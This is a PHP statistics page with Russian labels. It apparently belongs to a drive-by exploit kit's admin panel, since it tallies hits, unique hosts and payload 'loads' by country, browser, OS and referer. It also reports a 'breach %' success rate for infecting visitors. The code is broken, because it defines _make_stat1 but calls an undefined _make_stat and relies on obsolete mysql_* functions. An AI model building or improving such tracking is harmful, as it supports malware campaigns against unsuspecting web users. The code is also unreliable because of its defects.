<center>
<?php

include_once("config.php");
include_once("geoip.php");
include_once("functions.php");

function _make_stat1($t,$rows = array(),$a1 = array(),$a2 = array(),$a3 = array())
{
	if (empty($a1)) {echo "<br><center>пусто</center><br>";return 0;}
	echo "<table border=1 width=500><tr style='text-align:center;background:#000000;color:white;'><td colspan=".count($rows).">".$t."</td></tr>";
	echo "<tr style='text-align:center;background:#222222;color:white;'>";
	for ($c=0;$c<count($rows);$c++)
	{
		echo "<td>".$rows[$c]."</td>";
	}
	echo "</tr>";
	while(list($key,$value)=each($a1))
	{
		if (@$a3[$key]==0 or @$a2[$key]==0)
		{
			$pr=0;
		} else {
			$pr=round((100*@$a2[$key]/@$a3[$key]), 2);
		}
		
		echo "<tr>";
		echo "<td>&nbsp;".$key."&nbsp;</td>";
		echo "<td>&nbsp;".@$a1[$key]."&nbsp;</td>";
		echo "<td>&nbsp;".@$a3[$key]."&nbsp;</td>";
		echo "<td>&nbsp;".@$a2[$key]."&nbsp;</td>";
		echo "<td>&nbsp;".$pr."&nbsp;</td>";
		echo "</tr>";
	}
	echo "</table><br>";
}

function _stat()
{
	GLOBAL $mysql;
	mysql_connect($mysql['host'], $mysql['user'], $mysql['password']) or die("Немогу подкл. к серверу мускула!");
	mysql_select_db($mysql['db']) or die("БД ".$mysql['db']." не найдена!");
	$r = mysql_query("SELECT * FROM `hits`");
	while ($line = mysql_fetch_array ($r))
	{
		@$hits_ip[$line['ip']]++;
		@$hits_country[$line['country']]++;
		@$hits_browser[$line['browser']]++;
		@$hits_os[$line['os']]++;
		@$hits_referer[$line['referer']]++;
	}

	$r = mysql_query("SELECT * FROM `hosts`");
	while ($line = mysql_fetch_array ($r))
	{
		@$hosts_ip[$line['ip']]++;
		@$hosts_country[$line['country']]++;
		@$hosts_browser[$line['browser']]++;
		@$hosts_os[$line['os']]++;
		@$hosts_referer[$line['referer']]++;
	}

	$r = mysql_query("SELECT * FROM `loads`");
	while ($line = mysql_fetch_array ($r))
	{
		@$loads_ip[$line['ip']]++;
		@$loads_country[$line['country']]++;
		@$loads_browser[$line['browser']]++;
		@$loads_os[$line['os']]++;
		@$loads_referer[$line['referer']]++;
	}
	echo "<br>Хиты:".@mysql_num_rows(mysql_query('SELECT * FROM hits'))." Хосты:".@mysql_num_rows(mysql_query('SELECT * FROM hosts'))." Загрузки:".@mysql_num_rows(mysql_query('SELECT * FROM loads'))."<br><br>";
	_make_stat('СТРАНЫ',array('Страна','Хиты','Хосты','Загрузки','Пробив %'),@$hits_country,@$loads_country,@$hosts_country);
	_make_stat('БРАУЗЕРЫ',array('Браузер','Хиты','Хосты','Загрузки','Пробив %'),@$hits_browser,@$loads_browser,@$hosts_browser);
	_make_stat('ОСИ',array('ОС','Хиты','Хосты','Загрузки','Пробив %'),@$hits_os,@$loads_os,@$hosts_os);
	_make_stat('РЕФЫ',array('Реферер','Хиты','Хосты','Загрузки','Пробив %'),@$hits_referer,@$loads_referer,@$hosts_referer);
}
_stat();
?>
</center>